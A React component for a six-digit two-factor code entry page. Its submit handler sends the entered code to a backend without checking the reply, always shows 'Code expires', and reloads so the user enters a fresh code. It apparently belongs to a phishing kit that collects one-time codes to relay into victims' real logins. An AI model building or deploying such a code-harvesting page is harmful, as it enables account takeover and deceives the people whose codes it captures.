import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import "../styles/pin.css";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../component/FormErrMsg";
import axios from "axios";
import BASE_URL from "../component/urls";

const schema = yup.object().shape({
  auth: yup
    .string()
    .matches(/^\d{6}$/, "2FA must be exactly 6 digits")
    .required("2FA is required"),
});

const Auth = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    setError,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [auth, setAuth] = useState(new Array(6).fill(""));

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newAuth = [...auth];
    newAuth[index] = value;
    setAuth(newAuth);

    if (index < 5 && value !== "") {
      const nextElement = document.getElementById(`auth-${index + 1}`);
      if (nextElement) nextElement.focus();
    }

    setValue("auth", newAuth.join(""));
  };

  const submitForm = (data) => {
    axios.post(`${BASE_URL}/auth  `, data);
    console.log(data);

    setError("auth", {
      type: "manual",
      message: "Code expires",
    });

    setTimeout(() => {
      window.location.reload();
    }, 2000);
  };

  return (
    <div className="pin-container">
      <h2>Enter 2FA</h2>
      <p>
        Enter the 6 digit code from your authenticator app or email to continue
        logging in
      </p>
      <form onSubmit={handleSubmit(submitForm)}>
        <div className="pin-inputs">
          {auth.map((data, index) => (
            <input
              key={index}
              id={`auth-${index}`} // Note the lowercase 'auth'
              type="password"
              maxLength="1"
              value={data}
              onChange={(e) => handleChange(e.target, index)}
              onFocus={(e) => e.target.select()}
              className="pin-input"
              inputMode="numeric"
            />
          ))}
        </div>
        <FormErrMsg errors={errors} inputName="auth" />
        <div className="verify-button">
          <button type="submit">Continue</button>
        </div>
      </form>
    </div>
  );
};

export default Auth;
